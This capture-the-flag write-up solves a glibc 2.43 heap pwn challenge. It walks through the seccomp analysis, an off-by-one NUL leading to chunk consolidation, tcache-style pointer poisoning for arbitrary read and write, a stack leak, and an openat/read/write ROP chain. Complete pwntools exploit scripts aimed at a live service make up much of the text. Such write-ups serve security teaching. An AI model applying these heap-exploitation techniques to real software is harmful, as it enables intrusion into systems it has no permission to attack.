---
title: "Original Unlimited Codex 100% Free"
category: "Pwn"
tags: ["off-by-one", "heap-consolidation", "tcache-poisoning", "seccomp", "orw-rop", "glibc-2.43"]
solve_date: "2026-10-10T17:03:00+07:00"
language: "en"
points: 908
---

# Original Unlimited Codex 100% Free

**Flag:** `kBxAc{~~p4y1ng_f0r_5ub5cr1pt10n_15_n0t_th3_0nly_w4y_t0_g3t_c0d3x_y0u_c4n_51mply_ju5t_51mply_d0wnl04d_fr33_unl1m1t3d_v3r510n_fr0m_1nt3rn3t~~}`  
**Service:** `nc 34.82.235.213 1337` (socat forking, binary run with the bundled `ld-2.43.so`/`libc.so.6`)  
**Flag format:** `kBxAc{}`

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `handout.7z` | 757,389 | `c14c6fecb0fbcd526fb1936d32c600f0438081f7d8b5bdd12cc789a1f1449796` |
| `unlimited_codex_for_free` | 14,464 | `0807462400d708343852e25efb939cf5e4f6dd146bedd3c54214539d14c6b346` |
| `libc.so.6` (Debian glibc 2.43-4) | 2,014,248 | `38d7683f427c9ff265656bd35130d070afac1a58738607eacd70a268f7792063` |
| `ld-2.43.so` | 230,200 | `fc181016dc31c41f03ecb9014788006e0282616105740a58135641a0d9b7210e` |
| `flag.txt` (test file, `kBxAc{TEST_FLAG}`) | 17 | `2cb571008c565006bb09836623f82c1cda5b2a51052830b2b210d837ee4d4f2c` |
| `Dockerfile` | 459 | `ca8abfda8493f511cd71e5b514ee1a3483dcf485b0a875e5f8be4909b66efcae` |

## Challenge

> Pwn — Original Unlimited Codex 100% Free — 993 points. Claim your Free Unlimited Codex Here 💑

The handout contains a menu binary that runs inside an `ubuntu:24.04` container together with `ld-2.43.so` and `libc.so.6`. `flag.txt` sits next to the binary and the service runs as the `player` user. The objective is to read the flag from the remote.

## Analysis

**Protections and program surface.** `readelf -h` reports `DYN` (PIE), `GNU_STACK` with `RW` only (NX active), `GNU_RELRO` covering `.got`/`.got.plt` (Full RELRO), a `__stack_chk_fail` reference (stack canary), and a stripped binary. The PLT holds 12 functions, with no `system`/`execve` but with `prctl`. At `0x14f0` the program calls `prctl(0x26, 1)` (`PR_SET_NO_NEW_PRIVS`) and then `prctl(0x16, 2, filter)` (`PR_SET_SECCOMP`); the `sock_fprog` at `0x3d50` (file offset `0x2d50`) holds `len = 53` and a pointer to 53 `sock_filter` instructions at `0x2400`. Decoded filter:

```text
ld [arch] ; jeq 0xc000003e ? next : RET KILL_PROCESS     # x86-64 only
ld [nr]
jeq 0(read) 1(write) 3(close) 8(lseek) 9(mmap) 10(mprotect) 11(munmap)
    12(rt_sigaction) 13(brk) 14(rt_sigreturn) 20(getpid) 25(mremap) 28(madvise)
    60(exit) 158 202(futex) 218 231(exit_group) 257(openat) 262(newfstatat)
    273 302(prctl) 318 334(rseq) -> RET ALLOW
default -> RET KILL_PROCESS
```

`execve` (59), `fork` (57), `clone` (56) and `dup2` (34) are absent, so the exploit avoids `execve` and uses a ROP chain issuing `openat`/`read`/`write`.

**Menu and the shelf model.** `0x1556` reads one line into `char buf[0x60]` at `[rbp-0x70]` (byte-at-a-time, stops at `\n`, `_exit` past 0x60) and dispatches:

| Command | Function | Behaviour |
|---|---|---|
| `scribe i n` + data | `0x1992` | `24 ≤ n ≤ 0x1000`, `shelves[i].ptr` must be empty; `malloc(n)`, reads exactly `n` bytes; `size=n`, `flag=1` |
| `amend i n` + data | `0x1a86` | `n ≥ 0x18`, `n ≤ shelves[i].size`; reads `n` bytes into `ptr`; **if `n == size` then `ptr[n] = 0`** |
| `read i n` | `0x1b2e` | `write(1, ptr, n)` with `n ≤ size + 0x20` → over-read up to 32 bytes into the next chunk |
| `bind a b` | `0x1bcc` | copies `shelves[b].ptr/size` into `a`, sets `flag=2`; **does not clear `b`** → two shelves point at one chunk |
| `burn i` | `0x1ce6` | only when `flag == 1`: `free(ptr)`, then `ptr=0`, `size=0`, `flag=0` |
| `index` | `0x1d7a` | prints `i:@` for `flag=2`, `i:#` for `flag=1` |
| `quit` | — | returns from `main` (after the canary check) |

`0x1e77` rejects `i > 0x1f` (32 shelves). The numeric parser only validates the first character, so `strtoul` with base 0 still accepts `0x…` arguments.

Because `burn` is the only call site of `free` and it clears its own shelf, while a `bind` alias carries `flag=2` (which `amend`/`burn` both reject), **the menu does not permit direct writes or frees through these aliases**. Apart from the over-read, the only primitive is the single NUL byte written by `amend`.

**Where the NUL lands.** For a request `s`, the chunk is `align16(s+8)` and `ptr[s] = chunk_next + (s + 8 - align16(s+8)) + 8`. When `s ≡ 8 (mod 16)`, `align16(s+8) = s+8`, so `ptr[s]` hits **the low byte of the next chunk's `size` field** (not `prev_size`). Verified against the service: `scribe 4 0xf8` (chunk `0x100`) placed directly before `scribe 5 0x4f8` (chunk `0x500`) shows `0x501` at `ptr_C[0xf8]`; after `amend 4 248` that value becomes `0x500` — size unchanged, `PREV_INUSE` cleared. For the overwrite to clear only `PREV_INUSE` without changing the size, the following chunk must have `size % 0x100 == 0`.

An earlier attempt used `s = 0x28` (chunk `0x30`, size `0x31`): the NUL turned the size into `0` and the free printed `free(): invalid size`, exactly as the formula predicts since `0x31 & ~0xff = 0`.

**glibc 2.43 allocator behaviour, measured on the service (no local Linux runtime available).**

* `__libc_free` at `libc+0xa54a0`: the fast path uses per-size-class "bundles", storing `mem[0] = (mem >> 12) ^ head` and `mem[8] = tcache_key`, with the head kept in clear at `[tls_tcache + 0xa0 + idx*8]`, `idx = (chunksize - 0x20) >> 4` (larger classes use `bsr`). `__libc_malloc` at `libc+0xa4f70` pops with `head = slot`, `slot = (head >> 12) ^ *head`, checks only `head & 0xf == 0`, **never** re-validates `chunksize`, and does **not** restore the next chunk's `PREV_INUSE`.
* Threshold: chunks `≤ 0x300` go to a bundle, chunks `≥ 0x430` go to the bins. A bin insert leaves `fd = bk = main_arena + 8 = libc + 0x1e7ac8`, which gives the libc base by subtraction; every sampled leak produced a page-aligned base under this constant.
* The **first** free of a class also allocates a `0x300` bundle chunk from the top, so the heap layout becomes `x(0x300) → y(0x300) → bundle(0x300) → C(0x100) → Q(0x500) → R → S`; knowing `mem_x` absolutely gives `mem_C = mem_x + 0x900`.
* `unlink_chunk` (`libc+0xa1450`) checks `chunksize(p) == *(p + chunksize(p))`, then `fd->bk == p` and `bk->fd == p` using **unprotected** pointers (bins are not safe-linked).
* Absolute heap leak: two same-class chunks freed back-to-back yield `mem_x[0] = page` (the bin was empty) and `mem_y[0] = page ^ mem_x`, so `mem_x = mem_y[0] ^ page` byte-exactly.

## Solution

1. **Heap leak.** `scribe 0/1` of size `0x2f8`, then `bind 2 0`, `bind 3 1`, `burn 0`, `burn 1`. Reading the aliases through `read` (the `+0x20` over-read stays in range) gives `page = mem_x >> 12` and `mem_x = page ^ mem_y[0]`.
2. **Shape the layout.** `scribe 4 = C (0xf8)`, `scribe 5 = Q (0x4f8)`, `scribe 6/7 = R, S (0x4f8)`; the guards keep Q away from the top and make `inuse_bit_at_offset(R, 0x100)` valid. Confirm `ptr_C[0xf8] == 0x501` so Q really follows C.
3. **Targeted NUL.** `amend 4 248` with data containing: `ptr_C[0x18] = 0xe0` (fake chunk size), `ptr_C[0x20] = ptr_C[0x28] = mem_C + 0x10` (self-linked fake chunk, required to survive `unlink_chunk`), `ptr_C[0xf0] = 0xe0` (`Q->prev_size`). Because `len == size`, the command also writes `0x00` at `ptr_C[0xf8]` → `Q->size = 0x500`.
4. **Consolidation into C.** `burn 5`: `PREV_INUSE(Q) == 0`, `prev = Q - 0xe0 = mem_C + 0x10`, `chunksize(prev) == prev_size`, and the self-referential fd/bk satisfy `unlink_chunk`. The merged chunk `[mem_C+0x10, mem_C+0x5f0)` of size `0x5e0` lands in the unsorted bin, and its `fd/bk` are written at `ptr_C[0x20]/0x28` — i.e. `main_arena + 8` → **libc base**.
5. **Overlapping chunk.** `scribe 9 0x5d8` (chunk `0x5e0`, exact fit) takes the merged chunk, so `X_mem = mem_C + 0x20` and X's header (`ptr_C[0x10]`, `ptr_C[0x18]`) lies inside memory C can still write. `amend 4` rewrites `X->size` to `0x41` (or `0x1f1`) to change the class, then `burn 9` pushes `X_mem` into that bundle.
6. **Next-pointer poisoning.** `amend 4` writes `X_mem[0] = (X_mem >> 12) ^ target`, matching the pop's un-mangling. `scribe A` pops `X_mem` and leaves `head = target`; `scribe B` pops `target`, so shelf B now carries an arbitrary pointer. `read B` yields up to `size+0x20` bytes, `amend B` writes `size` bytes. The small class (`0x30`) is used for reads since each scribe destroys only `0x30` bytes; the large class (`0x1e0`) is used for the decisive write.
7. **Locate the return address.** Read `environ` at `libc + 0x1eede8` (choosing `target = env - 0x30` keeps the wanted 8 bytes outside the destroyed area) to obtain a stack pointer. Sweep 0x160 bytes downward in 0x20-byte windows and keep slots whose value falls in `[libc+0x28000, libc+0x190000)`. `__libc_start_main = libc+0x2a050 (size 0x14b)`; the slot holding `libc+0x29fba` belongs to the function immediately before it (`__libc_start_call_main`, the return site of `call main`), its `rbp-8` neighbour is a canary whose low byte is 0, and the saved `rbp` is a stack address — that slot is `main`'s return address. Sending `quit` then `ret`s into the ROP chain.
8. **ROP.** Write at `R-0x10` the old canary + saved rbp + gadget chain (the `fs:0x28` check still passes), with the string `"/app/flag.txt"` at `R+0x120` and the read buffer at `R+0x160`:

```text
pop_rdi=-100, pop_rsi=path, pop_rdx=0, pop_rax=257, syscall        # openat
pop_rdi=3,    pop_rsi=buf,  pop_rdx=0x100, pop_rax=0, syscall       # read
pop_rdi=1,    pop_rsi=buf,  pop_rdx=0x100, pop_rax=1, syscall       # write(1, buf)
pop_rax=231, pop_rdi=0, syscall                                     # exit_group
```

`fd = 3` is correct because `socat EXEC` occupies fds 0/1/2 (stderr is merged into the socket).

## Solve code

The three files below are run from the same directory. `codex_io.py` and `codex_util.py` implement the menu client and response parsing; `codex.py` is the full exploit chain (the version that produced the flag).

```python
# codex_io.py
import re
from pwn import remote

HOST, PORT = '34.82.235.213', 1337
ANSI = re.compile(rb'\x1b\[[0-9;]*[A-Za-z]')

def clean(b):
    return ANSI.sub(b'', b)

def boot(timeout=6):
    r = remote(HOST, PORT, timeout=timeout)
    r.recvrepeat(1.0)
    return r

def raw(r, data, wait=0.35, timeout=4):
    r.send(data)
    try:
        out = r.recvrepeat(wait)
    except Exception as e:
        out = b'<recv-err:%s>' % str(e).encode()
    return out

def cmd(r, s, wait=0.3, timeout=4):
    if isinstance(s, str):
        s = s.encode()
    return raw(r, s + b'\n', wait, timeout)
```

```python
# codex_util.py
from codex_io import *
import struct

def q(b, i):
    return struct.unpack('<Q', b[i:i+8])[0]

def pread(r, idx, n):
    out = cmd(r, 'read %d %d' % (idx, n), wait=0.4)
    c = clean(out)
    if b'folio stream' not in c:
        return None, c
    body = c.split(b'\n', 1)[1]
    return body[:n], c

def scribe(r, idx, size, data):
    assert len(data) == size
    return raw(r, b'scribe %d %d\n' % (idx, size) + data, wait=0.35)

def amend(r, idx, size, data):
    assert len(data) == size
    return raw(r, b'amend %d %d\n' % (idx, size) + data, wait=0.35)
```

```python
# codex.py
import sys, struct, re
from codex_util import *
from codex_io import clean

ARENA_UNSORTED = 0x1e7ac8
ENVIRON        = 0x1eede8
POP_RDI        = 0x2aaf7
POP_RSI        = 0x29e69
POP_RDX_POP_RBX= 0x91665
POP_RAX        = 0x43ee6
SYSCALL_RET    = 0x921b2
ZERO = bytes([0])
TEXT_LO, TEXT_HI = 0x28000, 0x190000

sC, sQ, sG = 0xf8, 0x4f8, 0x4f8
FAKE       = 0xe0
sX         = 0x5d8
LW         = 0x2f8
BIG, SMALL = 0x1e0, 0x30          # scribe sizes -> chunk 0x1f0 / 0x40
BIGSZ, SMALLSZ = 0x1f1, 0x41      # claimed chunk-size values

def p64(v): return struct.pack('<Q', v & ((1<<64)-1))
def u64(b, i=0): return struct.unpack('<Q', b[i:i+8])[0]
def L(t, o=''):
    print('  > %-20s %s' % (t, o if isinstance(o, str) else repr(o if not isinstance(o, bytes) else clean(o))[:200]))

class Codex:
    def __init__(self):
        self.r = boot(); self.A = 11; self._nb = 12; self.holder = None
    def scribe(self, idx, size, data):
        assert len(data) == size
        return raw(self.r, b'scribe %d %d\n' % (idx, size) + data, wait=0.5)
    def amend(self, idx, size, data):
        o = cmd(self.r, 'amend %d %d' % (idx, size), wait=0.15)
        return o + raw(self.r, data, wait=0.5)
    def rd(self, idx, n): return pread(self.r, idx, n)[0]
    def burn(self, idx): return cmd(self.r, 'burn %d' % idx, wait=0.6)
    def bind(self, a, b): return cmd(self.r, 'bind %d %d' % (a, b), wait=0.4)
    def quit(self):
        return cmd(self.r, 'quit', wait=3.0) + raw(self.r, b'', wait=2.5)

    def setup(self):
        r = self.r
        scribe(r, 0, LW, b'w'*LW); scribe(r, 1, LW, b'W'*LW)
        cmd(r, 'bind 2 0'); cmd(r, 'bind 3 1')
        cmd(r, 'burn 0', wait=0.5); cmd(r, 'burn 1', wait=0.5)
        d2 = self.rd(2, 0x20); d3 = self.rd(3, 0x20)
        page = u64(d2, 0); mem_x = u64(d3, 0) ^ page
        assert mem_x >> 12 == page
        self.mem_C = mem_x + 0x900
        self.X_mem = self.mem_C + 0x20
        prev = self.mem_C + 0x10
        scribe(r, 4, sC, b'C'*sC); scribe(r, 5, sQ, b'Q'*sQ)
        d = self.rd(4, sC + 0x20); assert u64(d, 0xf8) == 0x501, 'layout model wrong'
        scribe(r, 6, sG, b'R'*sG); scribe(r, 7, sG, b'S'*sG)
        pkt = bytearray(b'C'*sC)
        struct.pack_into('<Q', pkt, 0x18, FAKE)
        struct.pack_into('<Q', pkt, 0x20, prev)
        struct.pack_into('<Q', pkt, 0x28, prev)
        struct.pack_into('<Q', pkt, 0xf0, FAKE)
        self.amend(4, sC, bytes(pkt))
        d = self.rd(4, sC+0x20); assert u64(d, 0xf8) == 0x500
        self.bind(8, 5); self.burn(5)
        d = self.rd(4, sC + 0x20); assert d is not None and u64(d,0x20)==u64(d,0x28)
        self.libc = u64(d, 0x20) - ARENA_UNSORTED
        L('libc', hex(self.libc))
        scribe(r, 9, sX, b'X'*sX)
        self.bind(10, 9)
        self.retag_free(SMALLSZ)
        return True

    def retag_free(self, szval):
        pkt = bytearray(b'C'*0xf0)
        struct.pack_into('<Q', pkt, 0x18, szval)     # X chunk "size" field
        struct.pack_into('<Q', pkt, 0x20, 0)
        struct.pack_into('<Q', pkt, 0x28, 0)
        self.amend(4, 0xf0, bytes(pkt))
        self.burn(9 if self.holder is None else self.A)

    def poison(self, target, size):
        assert target % 16 == 0, hex(target)
        szval = BIGSZ if size == BIG else SMALLSZ
        # 1) retag X chunk so the upcoming free lands in the wanted class
        p = bytearray(b'C'*0xf0)
        struct.pack_into('<Q', p, 0x18, szval)
        self.amend(4, 0xf0, bytes(p))
        if self.holder is not None:
            self.burn(self.A)                 # X_mem -> that class' bundle
        # 2) now poison the bundled next pointer
        key = self.X_mem >> 12
        pkt = bytearray(b'C'*0xf0)
        struct.pack_into('<Q', pkt, 0x18, szval)
        struct.pack_into('<Q', pkt, 0x20, key ^ target)
        struct.pack_into('<Q', pkt, 0x28, 0)
        self.amend(4, 0xf0, bytes(pkt))
        self.scribe(self.A, size, b'A'*size)
        self._nb += 1
        b = self._nb
        if b > 31: raise SystemExit('shelves exhausted')
        self.scribe(b, size, b'B'*size)
        self.holder = self.A
        self.B = b
        return b

    def peek(self, addr, n=0x20):
        """intact read of n<=0x20 bytes at 16-aligned addr (clobbers 0x30 below)"""
        assert addr % 16 == 0 and n <= 0x20
        t = addr - SMALL
        self.poison(t, SMALL)
        d = self.rd(self.B, SMALL + 0x20)
        if d is None: return None
        off = addr - t
        return d[off:off+n]

    def poke(self, addr, data):
        assert len(data) <= BIG
        self.poison(addr, BIG)
        self.amend(self.B, BIG, data + b'\0'*(BIG-len(data)))

def build(libc, R):
    g = lambda o: libc + o
    ch = bytearray()
    def e(*v):
        for x in v: ch.extend(p64(x))
    path, buf = R + 0x120, R + 0x160
    e(g(POP_RDI), (-100) & ((1 << 64) - 1))
    e(g(POP_RSI), path)
    e(g(POP_RDX_POP_RBX), 0, 0)
    e(g(POP_RAX), 257)
    e(g(SYSCALL_RET))
    e(g(POP_RDI), 3)
    e(g(POP_RSI), buf)
    e(g(POP_RDX_POP_RBX), 0x100, 0)
    e(g(POP_RAX), 0)
    e(g(SYSCALL_RET))
    e(g(POP_RDI), 1)
    e(g(POP_RSI), buf)
    e(g(POP_RDX_POP_RBX), 0x100, 0)
    e(g(POP_RAX), 1)
    e(g(SYSCALL_RET))
    e(g(POP_RAX), 231)
    e(g(POP_RDI), 0)
    e(g(SYSCALL_RET))
    assert len(ch) <= 0x120, len(ch)
    return bytes(ch).ljust(0x120, ZERO) + b'/app/flag.txt' + ZERO * 7

def main():
    c = Codex(); c.setup()
    libc = c.libc
    d = c.peek((libc + ENVIRON) & ~0xf, 0x20)
    if d is None: L('environ peek died'); return
    off = (libc + ENVIRON) - ((libc + ENVIRON) & ~0xf)
    stackp = u64(d, off)
    L('environ', hex(libc+ENVIRON)); L('stack top-ish', hex(stackp))
    wins = {}
    W = (stackp - 0x160) & ~0xf
    L('sweep from', hex(W))
    while W < stackp - 0x10:
        blk = c.peek(W, 0x20)
        if blk is None: L('died at', hex(W)); break
        wins[W] = blk
        for i in range(0, 0x20, 8):
            v = u64(blk, i)
            if libc + TEXT_LO <= v < libc + TEXT_HI:
                L('text slot', '%s -> libc+0x%x' % (hex(W+i), v - libc))
        W += 0x20
    def wu(a):
        for base, blk in wins.items():
            if base <= a < base + 0x20 and a - base + 8 <= len(blk):
                return u64(blk, a - base)
        return None
    isstack = lambda a, s: a is not None and 0x7f0000000000 < a < 0x8000000000000 and abs(a - s) < 0x4000
    cands = []
    for W in sorted(wins):
        for i in range(0, 0x20, 8):
            slot = W + i; v = u64(wins[W], i)
            if libc + TEXT_LO <= v < libc + TEXT_HI:
                cands.append((slot, v, wu(slot-0x10), wu(slot-8)))
    for slot, v, can, rbp in cands:
        L('cand', '%s val=libc+0x%x canary=%s rbp=%s' % (hex(slot), v-libc,
            hex(can) if can is not None else None, hex(rbp) if rbp is not None else None))
    best = None
    for slot, v, can, rbp in sorted(cands):
        if can is not None and isstack(rbp, slot) and (can & 0xff) == 0:
            best = (slot, v, can, rbp); break
    if best is None and cands:
        slot, v, can, rbp = min(cands)
        best = (slot, v, can if can is not None else 0, rbp if rbp is not None else 0)
    if best is None:
        L('no main return slot found'); return
    R, retv, CAN, RBP = best
    L('CHOSEN R', '%s canary=%s rbp=%s' % (hex(R), hex(CAN), hex(RBP)))
    payload = build(libc, R)
    W = (R - 0x10) & ~0xf
    pad = (R - 0x10) - W
    c.poke(W, b'\0'*pad + p64(CAN) + p64(RBP) + payload)
    out = c.quit()
    print('=== RESULT ===')
    txt = clean(out)
    print(txt[:600])
    L('FLAG', re.findall(rb'kBxAc\{[^}\n\r\x00]*', out))
    c.r.close()

if __name__ == '__main__':
    main()
```

## Result

The `write` in the chain dumps 0x100 bytes, so the flag is followed by remaining stack bytes:

```text
b'kBxAc{~~p4y1ng_f0r_5ub5cr1pt10n_15_n0t_th3_0nly_w4y_t0_g3t_c0d3x_y0u_c4n_51mply_ju5t_51mply_d0wnl04d_fr33_unl1m1t3d_v3r510n_fr0m_1nt3rn3t~~}\x00\x00\x00\x008\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00 \xcbo\xa1\x7f\x00\x00...'
```

```text
kBxAc{~~p4y1ng_f0r_5ub5cr1pt10n_15_n0t_th3_0nly_w4y_t0_g3t_c0d3x_y0u_c4n_51mply_ju5t_51mply_d0wnl04d_fr33_unl1m1t3d_v3r510n_fr0m_1nt3rn3t~~}
```

The string above is the remote `flag.txt` content read via `openat`/`read`/`write`, not the `kBxAc{TEST_FLAG}` shipped in the artifact. No submission response was recorded.

A separate run (different ASLR layout, `write` limited to 0x60 bytes so the flag was cut off) keeps the intermediate values, useful for comparing output shape:

```text
  > libc                 0x7fb30e533000
  > environ              0x7fb30e721de8
  > stack top-ish        0x7ffcc94a4628
  > sweep from           0x7ffcc94a44c0
  > text slot            0x7ffcc94a44f8 -> libc+0x29fba
  > text slot            0x7ffcc94a45a8 -> libc+0x2a0d7
  > cand                 0x7ffcc94a44f8 val=libc+0x29fba canary=0x8ebc22d0a363e900 rbp=0x7ffcc94a4618
  > cand                 0x7ffcc94a45a8 val=libc+0x2a0d7 canary=0x8ebc22d0a363e900 rbp=0x0
  > CHOSEN R             0x7ffcc94a44f8 canary=0x8ebc22d0a363e900 rbp=0x7ffcc94a4618
=== RESULT ===
b'kBxAc{~~p4y1ng_f0r_5ub5cr1pt10n_15_n0t_th3_0nly_w4y_t0_g3t_c0d3x_y0u_c4n_51mply_ju5t_51mply_d0wn'
```

## Reproduce

Python 3 with `pwntools`; the handout files only have to be present once to derive the offsets (via `readelf`/`objdump`/a disassembler) — the script itself hard-codes no runtime address. The service forks per connection, so every run is a fresh process with a different ASLR layout.

```bash
pip install pwntools
python codex.py
```

Save the three fenced blocks as `codex_io.py`, `codex_util.py` and `codex.py`, then run the last one. If the libc build changes, the constants to re-derive are `ARENA_UNSORTED` (unsorted-bin head inside `main_arena`), `ENVIRON`, and the five gadgets (`pop rdi`, `pop rsi`, `pop rdx; pop rbx`, `pop rax`, `syscall; ret`).

Constraints worth knowing when adapting the chain:

* The bundle class decides the `scribe` size used at pop time: to change class, `X->size` must be rewritten **before** `burn`, because free reads the chunk header, not `shelves[i].size`.
* The address pushed into the head must satisfy `& 0xf == 0`; the pop does not check `chunksize` but aborts on a misaligned head.
* Sweep the stack with the small class (`0x30`): each `scribe` destroys `0x30` bytes below the window, so only the upper 0x20 bytes are intact. Using the large class (`0x1e0`) for sweeping overwrites `main`'s live frame and kills the process on the next read.
* The final write must restore the canary and the saved rbp, otherwise `quit` hits `__stack_chk_fail` before the `ret` into the ROP chain.
